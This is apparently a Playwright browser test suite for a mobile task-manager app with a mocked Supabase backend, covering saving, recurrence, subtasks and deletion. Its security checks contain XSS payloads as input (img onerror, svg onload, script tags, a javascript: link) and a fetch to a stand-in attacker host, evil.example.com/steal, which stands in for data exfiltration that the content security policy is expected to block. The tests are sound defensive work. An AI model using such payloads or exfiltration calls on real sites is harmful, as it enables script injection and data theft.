// Browser test suite against the production build with a mocked Supabase.
// Run: npm run e2e   (see e2e/run.sh; needs Playwright + a Chromium).
import { chromium } from 'playwright'
import { createMock, session } from './mock.mjs'
const BASE = process.env.BASE ?? 'http://localhost:5198/'
const OUT = process.env.E2E_OUT ?? '/tmp'
const iso = (k = 0) => { const d = new Date(); d.setDate(d.getDate() + k); return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}` }
const results = []
const browser = await chromium.launch(process.env.CHROMIUM_PATH ? { executablePath: process.env.CHROMIUM_PATH } : {})

async function scenario(name, fn) {
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, serviceWorkers: 'block' })
  const page = await ctx.newPage()
  const mock = createMock()
  const errors = []
  page.on('pageerror', (e) => errors.push(e.message))
  page.on('console', (m) => m.type() === 'error' && !/Content Security Policy|Failed to load resource/.test(m.text()) && errors.push(m.text()))
  await page.route('http://mock.supabase.local/**', mock.handler)
  await page.addInitScript((s) => { try { localStorage.setItem('sb-mock-auth-token', s) } catch {} }, session('11111111-1111-1111-1111-111111111111'))
  try {
    await fn({ page, mock, ctx })
    if (errors.length) throw new Error('page errors: ' + errors.join(' | '))
    results.push(['PASS', name])
  } catch (e) {
    results.push(['FAIL', name, e.message.split('\n')[0]])
    await page.screenshot({ path: `${OUT}/fail-${name.replace(/\W+/g, '_')}.png`, fullPage: true }).catch(() => {})
  }
  await ctx.close()
}

const dlg = (page) => page.getByRole('dialog')
async function boot(page) { await page.goto(BASE); await page.getByText('Due today', { exact: true }).waitFor() }
async function newTask(page, { title, p = 'P3', cat = 'Admin', due = iso(), forever = false, repeat, end, check, notes }) {
  await page.getByRole('button', { name: 'Add task', exact: true }).click()
  await dlg(page).locator('input[type=text]').first().fill(title)
  await page.getByRole('button', { name: p, exact: true }).click()
  await dlg(page).getByRole('button', { name: cat, exact: true }).click()
  if (forever) await page.getByText('Forever / ongoing').click()
  if (due) await dlg(page).locator('input[type=date]').first().fill(due)
  if (repeat) {
    await page.getByText('Repeats').click()
    await dlg(page).locator('input[type=number]').fill(String(repeat))
    if (end) await dlg(page).locator('input[type=date]').nth(1).fill(end)
  }
  if (notes) await dlg(page).locator('textarea').fill(notes)
  if (check) { await page.getByRole('button', { name: '+ Add item' }).click(); await dlg(page).locator('.checklist-item input[type=text]').last().fill(check) }
  await page.getByRole('button', { name: 'Save' }).click()
}
const row = (page, text) => page.locator('.task-row', { hasText: text }).first()

await scenario('XSS payloads render as inert text everywhere', async ({ page }) => {
  await boot(page)
  await page.getByRole('button', { name: 'Add task', exact: true }).click()
  await page.getByRole('button', { name: '+ New' }).click()
  await page.getByPlaceholder('Category name').fill('<img src=x onerror="window.__xss=4">')
  await page.getByRole('button', { name: 'Add', exact: true }).click()
  await dlg(page).locator('input[type=text]').first().fill('<img src=x onerror="window.__xss=1">')
  await page.getByRole('button', { name: 'P3', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso())
  await dlg(page).locator('textarea').fill('<script>window.__xss=2</script>\n<a href="javascript:window.__xss=5">x</a>')
  await page.getByRole('button', { name: '+ Add item' }).click()
  await dlg(page).locator('.checklist-item input[type=text]').fill('<svg onload="window.__xss=3">')
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, '<img src=x').click()
  await page.getByText('<script>window.__xss=2</script>', { exact: false }).waitFor()
  const r = await page.evaluate(() => ({ xss: window.__xss, imgs: document.querySelectorAll('img').length, svgs: document.querySelectorAll('.sheet svg, .task-row svg').length, anchors: document.querySelectorAll('.sheet a').length }))
  if (r.xss !== undefined || r.imgs || r.svgs || r.anchors) throw new Error('XSS: ' + JSON.stringify(r))
})

await scenario('CSP blocks injected inline scripts', async ({ page }) => {
  await boot(page)
  const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content'))
  if (!csp?.includes("script-src 'self'")) throw new Error('no CSP meta: ' + csp)
  await page.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__csp = 1'; document.body.appendChild(s) })
  await page.waitForTimeout(200)
  if (await page.evaluate(() => window.__csp)) throw new Error('inline script ran')
  const ext = await page.evaluate(() => fetch('https://evil.example.com/steal').then(() => 'sent', () => 'blocked'))
  if (ext !== 'blocked') throw new Error('exfiltration fetch not blocked')
})

await scenario('Refuses to run inside a frame (clickjacking)', async ({ page }) => {
  await page.setContent(`<iframe id="f" src="${BASE}" width="390" height="600"></iframe>`)
  const frame = await (await page.waitForSelector('#f')).contentFrame()
  await frame.getByText("can't be embedded").waitFor({ timeout: 10000 })
})

await scenario('Double-tap Save creates exactly one task', async ({ page, mock }) => {
  await boot(page)
  await page.getByRole('button', { name: 'Add task', exact: true }).click()
  await dlg(page).locator('input[type=text]').first().fill('Only once')
  await page.getByRole('button', { name: 'P2', exact: true }).click()
  await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso())
  await page.evaluate(() => { const b = [...document.querySelectorAll('button')].find((x) => x.textContent === 'Save'); b.click(); b.click(); b.click() })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.waitForTimeout(400)
  const n = mock.db.tasks.filter((t) => t.title === 'Only once').length
  if (n !== 1 || mock.calls.apply !== 1) throw new Error(`inserted ${n}, rpc calls ${mock.calls.apply}`)
})

await scenario('Double-tap Complete completes once', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Tap me', repeat: 3 })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.evaluate(() => { const b = document.querySelector('button[aria-label^="Complete “Tap me"]'); b.click(); b.click() })
  await page.getByText(/Completed — next due/).waitFor()
  await page.waitForTimeout(400)
  if (mock.db.completions.length !== 1 || mock.db.tasks.length !== 1) throw new Error(`completions ${mock.db.completions.length}, tasks ${mock.db.tasks.length}`)
})

await scenario('Server error on save is shown and nothing is lost', async ({ page, mock }) => {
  await boot(page)
  mock.faults.failWrite = 1
  await newTask(page, { title: 'Retry me' })
  await page.getByText('simulated server error').waitFor()
  if ((await dlg(page).locator('input[type=text]').first().inputValue()) !== 'Retry me') throw new Error('form lost input')
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Task added.', { exact: true }).waitFor()
})

await scenario('Network failure on complete is shown', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Offline one' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  mock.faults.abortWrite = 1
  await page.getByRole('button', { name: 'Complete “Offline one”' }).first().click()
  await page.getByText(/Couldn't save/).waitFor()
  if (mock.db.tasks.length !== 1) throw new Error('task vanished')
  await row(page, 'Offline one').waitFor()
})

await scenario('Load failure shows error with working Retry', async ({ page, mock }) => {
  mock.faults.failLoad = 1000 // more than the client library's automatic retries
  await page.goto(BASE)
  await page.getByText(/Couldn't load your tasks/).waitFor({ timeout: 60000 })
  mock.faults.failLoad = 0
  await page.getByRole('button', { name: 'Retry' }).click()
  await page.getByText('Due today', { exact: true }).waitFor()
})

await scenario('Edit task + checklist toggle persist', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Edit me', check: 'step one' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'Edit me').click()
  await page.locator('.checklist-view input').click()
  await page.locator('.checklist-view input:checked').waitFor()
  if (!mock.db.tasks[0].checklist[0].done) throw new Error('checklist toggle not saved')
  await page.getByRole('button', { name: 'Edit', exact: true }).click()
  await dlg(page).locator('input[type=text]').first().fill('Edited title')
  await page.getByRole('button', { name: 'P5', exact: true }).click()
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Task updated.').waitFor()
  const t = mock.db.tasks[0]
  if (t.title !== 'Edited title' || t.priority !== 5 || !t.checklist[0].done) throw new Error(JSON.stringify(t))
})

await scenario('Parent cannot move earlier than its subtask', async ({ page }) => {
  await boot(page)
  await newTask(page, { title: 'Parent', due: iso(5) })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.locator('.cal-cell', { has: page.locator('.cnt') }).first().click()
  await row(page, 'Parent').click()
  await page.getByRole('button', { name: '+ Add subtask' }).click()
  await dlg(page).locator('input[type=text]').first().fill('Child')
  await page.getByRole('button', { name: 'P2', exact: true }).click()
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Category is required.').waitFor() // no category default (spec)
  await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso(4))
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Subtask added.').waitFor()
  await page.getByRole('button', { name: 'Edit' }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso(3))
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText(/Subtask “Child” is due after this date/).waitFor()
})

await scenario('Recurrence end date stops the series', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Last one', repeat: 7, end: iso(3) })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.getByRole('button', { name: 'Complete “Last one”' }).first().click()
  await page.getByText('Completed.', { exact: true }).waitFor()
  if (mock.db.tasks.length !== 0) throw new Error('spawned occurrence past end date')
})

await scenario('Max nesting depth hides Add subtask at level 4', async ({ page }) => {
  await boot(page)
  await newTask(page, { title: 'L0', due: iso() })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'L0').click()
  for (let i = 1; i <= 4; i++) {
    await page.getByRole('button', { name: '+ Add subtask' }).click()
    await dlg(page).locator('input[type=text]').first().fill(`L${i}`)
    await page.getByRole('button', { name: 'P1', exact: true }).click()
    await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
    await page.getByRole('button', { name: 'Save' }).click()
    await page.getByText('Subtask added.').waitFor()
    await dlg(page).locator('.task-row', { hasText: `L${i}` }).click()
    await page.getByRole('dialog', { name: `L${i}` }).waitFor()
  }
  if (await page.getByRole('button', { name: '+ Add subtask' }).count()) throw new Error('depth 4 can add subtask')
  await page.getByRole('dialog').getByText('↳ L0 › L1 › L2 › L3', { exact: true }).waitFor()
})

await scenario('Forever task with a due date shows in Daily and Forever', async ({ page }) => {
  await boot(page)
  await newTask(page, { title: 'Ongoing today', forever: true, due: iso() })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.getByRole('button', { name: 'Daily' }).click()
  await row(page, 'Ongoing today').waitFor()
  await page.getByRole('button', { name: 'Forever', exact: true }).click()
  await row(page, 'Ongoing today').waitFor()
})

await scenario('Escape closes sheets; invalid recurrence rejected', async ({ page }) => {
  await boot(page)
  await page.getByRole('button', { name: 'Add task', exact: true }).click()
  await dlg(page).locator('input[type=text]').first().fill('R')
  await page.getByRole('button', { name: 'P1', exact: true }).click()
  await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso())
  await page.getByText('Repeats').click()
  await dlg(page).locator('input[type=number]').fill('2.5')
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Repeat interval must be a whole number').waitFor()
  await page.keyboard.press('Escape')
  if (await dlg(page).count()) throw new Error('Escape did not close')
})

await scenario('Delete asks first and cascades', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Doomed' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'Doomed').click()
  await page.getByRole('button', { name: '+ Add subtask' }).click()
  await dlg(page).locator('input[type=text]').first().fill('Doomed child')
  await page.getByRole('button', { name: 'P1', exact: true }).click()
  await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso())
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Subtask added.').waitFor()
  await page.getByRole('button', { name: 'Delete' }).click()
  await page.getByText('and its 1 open subtask(s)').waitFor()
  if (mock.db.tasks.length !== 2) throw new Error('deleted before confirming')
  await page.getByRole('button', { name: 'Delete' }).last().click()
  await page.getByText('Deleted.', { exact: true }).waitFor()
  if (mock.db.tasks.length !== 0 || mock.db.completions.length !== 0) throw new Error('bad cascade')
})

await browser.close()
for (const r of results) console.log(r.join('  '))
const passed = results.filter((r) => r[0] === 'PASS').length
console.log(`${passed}/${results.length} passed`)
process.exit(passed === results.length ? 0 : 1)
